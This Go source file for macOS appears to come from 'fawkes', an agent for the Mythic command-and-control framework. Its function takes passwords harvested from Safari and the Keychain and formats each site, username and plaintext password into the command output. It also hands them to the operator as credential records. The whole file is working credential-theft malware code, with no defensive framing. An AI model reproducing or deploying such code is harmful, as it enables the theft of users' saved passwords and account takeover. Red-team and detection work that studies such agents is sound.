//go:build darwin

package commands

import (
	"fmt"
	"strings"

	"fawkes/pkg/structs"
)

func appendSafariPasswords(result structs.CommandResult) structs.CommandResult {
	entries, errors := browserSafariPasswords()
	if len(entries) == 0 && len(errors) == 0 {
		return result
	}

	var sb strings.Builder
	sb.WriteString(result.Output)
	sb.WriteString(fmt.Sprintf("\n=== Safari / Keychain Passwords (%d entries) ===\n\n", len(entries)))
	for _, e := range entries {
		pass := e.Password
		if pass == "" {
			pass = "[keychain locked or prompt required]"
		}
		sb.WriteString(fmt.Sprintf("[Safari] %s\n  User: %s\n  Pass: %s\n\n", e.URL, e.Username, pass))
	}
	for _, errMsg := range errors {
		sb.WriteString(fmt.Sprintf("  %s\n", errMsg))
	}
	result.Output = sb.String()

	var creds []structs.MythicCredential
	if result.Credentials != nil {
		creds = *result.Credentials
	}
	for _, e := range entries {
		if e.Password != "" && e.Username != "" {
			creds = append(creds, structs.MythicCredential{
				CredentialType: "plaintext",
				Account:        e.Username,
				Credential:     e.Password,
				Realm:          e.URL,
				Comment:        "Safari/Keychain internet password",
			})
		}
	}
	if len(creds) > 0 {
		result.Credentials = &creds
	}

	return result
}
